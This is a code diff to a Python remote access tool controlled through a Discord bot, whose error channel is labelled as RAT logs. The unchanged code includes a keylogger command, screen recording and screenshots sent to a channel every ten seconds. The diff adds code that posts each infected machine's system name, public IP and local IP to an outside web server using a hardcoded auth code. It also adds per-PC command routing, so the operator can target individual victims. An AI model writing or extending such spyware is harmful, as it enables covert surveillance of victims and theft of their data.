@@ -12,6 +12,14 @@ import subprocess
 import winreg
 import pyautogui
 from io import BytesIO
+import discord
+from discord.ext import commands
+import sounddevice as sd
+import soundfile as sf
+import discord
+from discord.ext import commands
+import sounddevice as sd
+import soundfile as sf
 import urllib.parse
 import websockets
 import win32com.client as wincl 
@@ -68,10 +76,27 @@ from discord.ext import commands
 from pypresence import Presence
 import spotipy
 from spotipy.oauth2 import SpotifyOAuth
+from dotenv import load_dotenv
+import subprocess
+import ctypes
+import winreg
+import win32serviceutil
+import win32service
+import win32event
+import geocoder
+import time
 
-# Spotify credentials
-SPOTIPY_CLIENT_ID = 'CLIENT_ID'
-SPOTIPY_CLIENT_SECRET = 'CLIENT_SECERET_ID'
+# Unique identifier for this PC
+PC_ID = os.getenv('PC_ID', 'default_pc_id')
+
+load_dotenv()
+# Set up Spotify credentials
+SPOTIPY_CLIENT_ID = os.getenv('SPOTIPY_CLIENT_ID')
+SPOTIPY_CLIENT_SECRET = os.getenv('SPOTIPY_CLIENT_SECRET')
+base_url = os.getenv("BASE_URL")
+auth_code = os.getenv("AUTH_CODE")
+
+DISCORD_BOT_TOKEN = os.getenv('DISCORD_BOT_TOKEN')
 SPOTIPY_REDIRECT_URI = 'https://localhost:8000'
 
 
@@ -94,6 +119,17 @@ def get_public_ip():
     except requests.RequestException as e:
         print(f"Request failed: {e}")
         return 'N/A'
+
+def pc_id_check():
+    def wrapper(func):
+        async def wrapped(ctx, *args, **kwargs):
+            command = ctx.message.content.split()[1]
+            if command.startswith(f'{PC_ID}'):
+                await func(ctx, *args, **kwargs)
+            else:
+                await ctx.send(f"Command not executed: This command is intended for a different PC.")
+        return wrapped
+    return wrapper
 
 
 # Feature: CREATE CATEGORY & CHANNELS
@@ -142,6 +178,36 @@ async def on_ready():
             embed.set_footer(text=footer_text)
 
             await device_logs_channel.send(embed=embed)
+# Prepare the data to be uploaded
+         # Prepare the data to be uploaded
+
+
+
+
+    data = {
+        'auth_code': 'BJJFH8YRI$*y%',  # Include the authentication code
+        'bot_name': bot.user.name,
+        'system_name': system_name,
+        'public_ip': public_ip,
+        'system_ip': system_ip,
+        'status': 'online',
+        'date': current_time,
+    }
+
+    # Construct the URL
+    url = f'http://glitch.onlinewebshop.net/hades/status.php?auth={data["auth_code"]}'
+
+    # Upload the data to a web server
+    try:
+        response = requests.post(url, data=data)  # Sending data as form-encoded
+
+        if response.status_code == 200:
+            print('Data uploaded successfully:', response.json())  # Print response from PHP
+        else:
+            print(f'Failed to upload data. Status code: {response.status_code}, Response: {response.text}')
+    except requests.RequestException as e:
+        print(f'Error uploading data: {e}')
+
 # Command descriptions
 command_descriptions = {
  "/!streamscreen": "Sends the screenshot and sends.",
@@ -193,6 +259,7 @@ async def bot_commands(ctx):
     boxed_help_message = f"```md\n{help_message}```"
     await ctx.send(boxed_help_message)
 
+# Function to remove startup key
 # Function to remove startup key
 def remove_startup_key():
     try:
@@ -546,8 +613,6 @@ async def start_keylogger(ctx):
         listener.join()
 
 
-
-
 #streamscrenn
 @bot.command()
 async def recscreen(ctx):
@@ -716,6 +781,7 @@ async def play(ctx, *, song_name):
         await ctx.send('Error playing the song.')
 
 @bot.command()
+
 async def pause(ctx):
     try:
         sp = spotipy.Spotify(auth_manager=sp_oauth)
@@ -1124,6 +1190,9 @@ async def start_logging(ctx):
     screen_share_enabled = True
     await send_logs_and_screenshot(ctx)
 
+
+    
+
 # Stop logging command
 @bot.command()
 async def stop_logging(ctx):
@@ -1147,6 +1216,7 @@ async def send_logs_and_screenshot(ctx):  # Add ctx as a parameter
 
         # Attach the screenshot to the embed
         file = discord.File(screenshot_bytes, filename='screenshot.png')
+
         embed.set_image(url='attachment://screenshot.png')
 
         # Send the embed message to the specified channel
@@ -1160,6 +1230,20 @@ async def send_logs_and_screenshot(ctx):  # Add ctx as a parameter
 
         # Schedule the next execution of the coroutine after 10 seconds
         await asyncio.sleep(10)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 #error handling
@@ -1179,4 +1263,4 @@ async def on_command_error(ctx, error):
     else:
         print(f"Error channel '・🔔│ʀᴀᴛ-ʟᴏɢꜱ' not found or bot doesn't have access.")
 # Run the bot with the token
-bot.run("YOUR_BOT_TOKEN")
+bot.run(DISCORD_BOT_TOKEN)
